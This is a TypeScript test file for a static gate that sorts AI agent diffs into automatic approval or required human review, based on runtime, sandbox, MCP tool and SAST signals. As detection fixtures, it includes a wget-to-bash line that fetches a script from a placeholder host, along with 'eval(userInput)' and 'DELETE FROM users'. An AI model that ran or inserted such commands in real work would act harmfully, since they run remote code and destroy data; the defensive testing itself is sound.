import { afterEach, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { classifyStaticGate } from "../../../src/services/safe-apply/static-gate-service";
import type {
  McpToolRisk,
  RuntimeDiffArtifact,
  RuntimeSecurityMetadata,
  VerificationEvidence,
} from "../../../src/services/safe-apply/safe-apply-types";

const tempDirs: string[] = [];

function tempFile(contents: string) {
  const dir = mkdtempSync(join(tmpdir(), "safe-apply-gate-"));
  tempDirs.push(dir);
  const file = join(dir, "diff.patch");
  writeFileSync(file, contents, "utf8");
  return file;
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop();
    if (dir) rmSync(dir, { recursive: true, force: true });
  }
});

function runtimeSecurity(
  overrides: Partial<RuntimeSecurityMetadata> = {},
): RuntimeSecurityMetadata {
  return {
    runtimeSource: "ucm",
    commandPath: null,
    argvFlags: [],
    sandboxMode: null,
    permissionMode: "interactive",
    permissionSignals: ["runtime:ucm"],
    envPermissionHints: [],
    runtimeWorkspaceStrategy: "git_worktree",
    executionSandbox: null,
    ...overrides,
  };
}

function diffArtifact(overrides: Partial<RuntimeDiffArtifact> = {}): RuntimeDiffArtifact {
  return {
    artifactId: "artifact_diff",
    artifactType: "runtime_diff",
    storageKind: "file",
    storageRef: tempFile("diff --git a/docs/a.md b/docs/a.md\n+hello\n"),
    diffHash: "hash",
    diffAlgorithm: {
      command: ["git", "diff", "--no-color", "--binary", "--full-index", "--find-renames=50%"],
      gitVersion: "git version 2.43.0",
      hash: "sha256",
    },
    baseRevision: "base",
    changedFiles: [
      {
        path: "docs/a.md",
        status: "modified",
        additions: 1,
        deletions: 0,
        isBinary: false,
        isExecutable: false,
      },
    ],
    addedLines: 1,
    removedLines: 0,
    isEmpty: false,
    ...overrides,
  };
}

test("classifyStaticGate forces human review for runtime, workspace, and side-effect risks", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity({
      runtimeSource: "codex",
      permissionMode: "headless",
      runtimeWorkspaceStrategy: "workspace_root",
    }),
    diffArtifact: diffArtifact({
      baseRevision: null,
      isEmpty: true,
      changedFiles: [],
      addedLines: 0,
      removedLines: 0,
      storageRef: tempFile(""),
    }),
    verification: [],
    trustedMcpServerCalled: true,
    observedSideEffectEventTypes: ["tool.call"],
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons.map((reason) => reason.code)).toEqual(
    expect.arrayContaining([
      "runtime_headless",
      "workspace_root_fallback",
      "base_revision_unknown",
      "trusted_mcp_server_called",
      "empty_diff_with_side_effects",
      "missing_verification",
    ]),
  );
});

test("classifyStaticGate detects high-risk paths, content, deletions, binary, and executable files", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact({
      storageRef: tempFile("+eval(userInput)\n+DELETE FROM users\n"),
      changedFiles: [
        {
          path: "packages/db/src/schema.ts",
          status: "modified",
          additions: 2,
          deletions: 51,
          isBinary: false,
          isExecutable: false,
        },
        {
          path: "bin/tool",
          status: "added",
          additions: 1,
          deletions: 0,
          isBinary: false,
          isExecutable: true,
        },
        {
          path: "assets/blob.bin",
          status: "modified",
          additions: 0,
          deletions: 0,
          isBinary: true,
          isExecutable: false,
        },
        {
          path: "old.ts",
          status: "deleted",
          additions: 0,
          deletions: 1,
          isBinary: false,
          isExecutable: false,
        },
      ],
      addedLines: 3,
      removedLines: 52,
    }),
    verification: [{ kind: "test", command: "bun test", exitCode: 0, status: "passed" }],
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons.map((reason) => reason.code)).toEqual(
    expect.arrayContaining([
      "high_risk_path",
      "high_risk_content",
      "large_deletion",
      "binary_or_executable",
      "deleted_file",
    ]),
  );
});

test("classifyStaticGate detects wget piped to bash as high-risk content", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact({
      storageRef: tempFile("+wget https://example.test/install.sh | bash\n"),
    }),
    verification: [{ kind: "test", command: "bun test", exitCode: 0, status: "passed" }],
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons).toContainEqual(expect.objectContaining({
    code: "high_risk_content",
    evidence: "wget pipe shell",
  }));
});

test("classifyStaticGate forces human review for mutating, unknown, and unresolved MCP tool risk", async () => {
  const mcpToolRisk: McpToolRisk[] = [
    {
      namespacedToolName: "mcp__github__create_issue",
      serverId: "mcp_github",
      serverName: "github",
      toolName: "create_issue",
      policy: "mutating",
      source: "manual",
      callCount: 1,
      risk: "requires_review",
      reason: "tool_mutating",
    },
    {
      namespacedToolName: "mcp__docs__search",
      serverId: "mcp_docs",
      serverName: "docs",
      toolName: "search",
      policy: "unknown",
      source: "discovered",
      callCount: 2,
      risk: "requires_review",
      reason: "tool_unknown",
    },
    {
      namespacedToolName: "mcp__ambiguous__run",
      serverId: null,
      serverName: "ambiguous",
      toolName: "run",
      policy: "unknown",
      source: "unresolved",
      callCount: 1,
      risk: "requires_review",
      reason: "tool_unresolved",
    },
  ];

  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact(),
    verification: [{ kind: "docs_not_required", status: "not_required" }],
    mcpToolRisk,
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons).toEqual(
    expect.arrayContaining([
      expect.objectContaining({ code: "mcp_mutating_tool_called", evidence: "mcp__github__create_issue" }),
      expect.objectContaining({ code: "mcp_unknown_tool_policy", evidence: "mcp__docs__search" }),
      expect.objectContaining({ code: "mcp_tool_unresolved", evidence: "mcp__ambiguous__run" }),
    ]),
  );
});

test("classifyStaticGate ignores legacy trustedMcpServerCalled when mcpToolRisk is present", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact(),
    verification: [{ kind: "docs_not_required", status: "not_required" }],
    trustedMcpServerCalled: true,
    mcpToolRisk: [],
  });

  expect(result).toEqual({ risk: "AUTO_OK", reasons: [] });
});

test("classifyStaticGate requires human review when execution sandbox is required but inactive", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity({
      executionSandbox: {
        mode: "required",
        provider: "bubblewrap",
        status: "unavailable",
        commandPath: null,
        reason: "provider_not_found",
        network: "host",
        filesystem: {
          mainWorkspace: "not_isolated",
          runtimeWorkspace: "host_writable",
          home: "isolated",
          tmp: "host",
        },
      },
    }),
    diffArtifact: diffArtifact(),
    verification: [{ kind: "docs_not_required", status: "not_required" }],
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons).toContainEqual(expect.objectContaining({
    code: "execution_sandbox_required",
    evidence: "bubblewrap:unavailable:provider_not_found",
  }));
});

test("classifyStaticGate does not change otherwise auto-ok risk for optional inactive execution sandbox", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity({
      executionSandbox: {
        mode: "optional",
        provider: "bubblewrap",
        status: "unavailable",
        commandPath: null,
        reason: "provider_not_found",
        network: "host",
        filesystem: {
          mainWorkspace: "not_isolated",
          runtimeWorkspace: "host_writable",
          home: "isolated",
          tmp: "host",
        },
      },
    }),
    diffArtifact: diffArtifact(),
    verification: [{ kind: "docs_not_required", status: "not_required" }],
  });

  expect(result).toEqual({ risk: "AUTO_OK", reasons: [] });
});

test("classifyStaticGate raises human review for SAST advisory findings", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact(),
    verification: [{ kind: "docs_not_required", status: "not_required" }],
    sastAdvisory: {
      status: "findings",
      scanner: "semgrep",
      reason: null,
      command: ["semgrep", "--json", "docs/a.md"],
      durationMs: 12,
      startedAt: "2026-05-14T00:00:00.000Z",
      finishedAt: "2026-05-14T00:00:00.012Z",
      findings: [
        {
          scanner: "semgrep",
          ruleId: "rule.eval",
          severity: "warning",
          path: "docs/a.md",
          line: 1,
          message: "eval call",
          metadata: {},
        },
      ],
    },
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons).toContainEqual(expect.objectContaining({
    code: "sast_advisory_finding",
    evidence: "semgrep: 1 finding",
  }));
});

test("classifyStaticGate raises human review when configured SAST is unavailable", async () => {
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact(),
    verification: [{ kind: "docs_not_required", status: "not_required" }],
    sastAdvisory: {
      status: "error",
      scanner: "semgrep",
      reason: "scanner failed",
      command: ["semgrep", "--json", "docs/a.md"],
      durationMs: 12,
      startedAt: "2026-05-14T00:00:00.000Z",
      finishedAt: "2026-05-14T00:00:00.012Z",
      findings: [],
    },
  });

  expect(result.risk).toBe("HUMAN_REQUIRED");
  expect(result.reasons).toContainEqual(expect.objectContaining({
    code: "sast_advisory_unavailable",
    evidence: "scanner failed",
  }));
});

test("classifyStaticGate allows docs-only interactive git-worktree changes when docs verification is not required", async () => {
  const verification: VerificationEvidence[] = [
    { kind: "docs_not_required", status: "not_required" },
  ];
  const result = await classifyStaticGate({
    runtimeSecurity: runtimeSecurity(),
    diffArtifact: diffArtifact(),
    verification,
  });

  expect(result).toEqual({
    risk: "AUTO_OK",
    reasons: [],
  });
});
